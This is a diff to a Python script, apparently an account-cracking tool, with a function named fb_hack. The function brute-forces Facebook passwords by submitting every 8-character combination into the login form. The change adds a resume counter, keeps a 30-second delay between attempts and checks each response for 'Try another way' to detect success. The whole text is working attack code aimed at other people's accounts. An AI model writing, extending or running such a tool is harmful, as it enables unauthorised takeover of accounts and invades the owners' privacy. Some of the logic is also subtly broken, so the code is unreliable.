@@ -59,29 +59,32 @@ def fb_hack(email, codex):
   for combination in itertools.product(["0","1","2","3","4","5","6","7","8","9","a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z","A","B","C","D","E","F","G","H","I","J","K","L","M","N","O","P","Q","R","S","T","U","V","","X","Y","Z","!","#","$","%","^","&","*"], repeat=8):
     p = (''.join(map(str, combination)))
     counter += 1
-    try:
-      browser.form['pass'] = p
-      browser.submit()
-    except:
+    if counter <= codex:
+      print("working", end='\r')
+    else:
+      try:
+        browser.form['pass'] = p
+        browser.submit()
+      except:
+        response1 = browser.response()
+        soup = BeautifulSoup(response1, 'html.parser')
+        with open("output1.html", "w") as file:
+          file.write(str(soup))
+      could = int(counter)
+      code1 = (str(could), str(p), "failed")
+      code2 = (str(could), str(p), "check")
+      h = " "
+      yo = h.join(code1)
+      yot = h.join(code2)
       response1 = browser.response()
       soup = BeautifulSoup(response1, 'html.parser')
-      with open("output1.html", "w") as file:
-        file.write(str(soup))
-    could = int(counter)
-    code1 = (str(could), str(p), "failed")
-    code2 = (str(could), str(p), "check")
-    h = " "
-    yo = h.join(code1)
-    yot = h.join(code2)
-    response1 = browser.response()
-    soup = BeautifulSoup(response1, 'html.parser')
-    taw = soup.find(string="Try another way")
-    if taw != "None":
-      print(yo)
-    else:
-      print(yot)
-      break
-    sleepy(30)
+      taw = soup.find(string="Try another way")
+      if taw != "None":
+        print(yo)
+      else:
+        print(yot)
+        break
+      sleepy(30)
     
   browser.select_form(nr=0)
   forms = list(browser.forms())
